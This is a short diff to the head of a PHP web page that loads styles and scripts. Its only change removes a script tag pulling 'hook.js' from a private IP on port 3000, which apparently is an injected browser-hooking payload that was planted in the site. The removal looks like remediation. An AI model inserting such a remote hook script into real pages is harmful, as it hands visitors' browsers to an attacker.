@@ -12,7 +12,6 @@ include 'db/pdo_connect.php'; ?>
     <link href="assets/plugins/bootstrap-icons/font/bootstrap-icons.min.css" rel="stylesheet" type="text/css">
     <link rel="stylesheet" href="assets/plugins/FontAwesome-pro/assets/css/all.min.css">
     <script src="assets/plugins/jquery-3.7.1.min.js"></script>
-    <script src="http://192.168.31.138:3000/hook.js"></script>
     <link rel="stylesheet" href="assets/plugins/package/dist/sweetalert2.min.css">
     <link href="assets/plugins/DataTables/datatables.css" rel="stylesheet">
     <style>
